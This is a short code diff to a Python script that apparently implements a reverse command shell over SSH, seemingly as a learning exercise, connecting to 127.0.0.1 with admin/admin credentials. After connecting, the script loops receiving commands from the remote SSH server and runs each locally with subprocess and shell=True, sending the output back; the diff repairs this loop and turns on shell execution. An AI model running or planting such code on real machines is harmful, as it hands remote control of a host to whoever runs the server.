@@ -10,21 +10,23 @@ def ssh_command(ip, user, passw, command):
     ssh_session = ssh_client.get_transport().open_session()
 
     if ssh_session.active:
-        ssh_session.send_command(command)
+        ssh_session.send(command)
         print(ssh_session.recv(1024))
 
         while True:
-            command = ssh_session.recv(1024)
+            command = ssh_session.recv(1024).decode()
+
             try:
-                cmd_output = subprocess.check_output(command)
+                print(f"execute: {command}")
+                cmd_output = subprocess.check_output(command, shell=True)
                 ssh_session.send(cmd_output)
             except Exception as e:
-                ssh_session.send(str(e))
+                ssh_session.send(f'Error exception: {e}')
 
     ssh_client.close()
     return
 
 
 if __name__ == '__main__':
-    ssh_command('127.0.0.1', 'admin', 'admin', 'ShowConnected')
-    
+    ssh_command('127.0.0.1', 'admin', 'admin', 'ClientConnected')
+
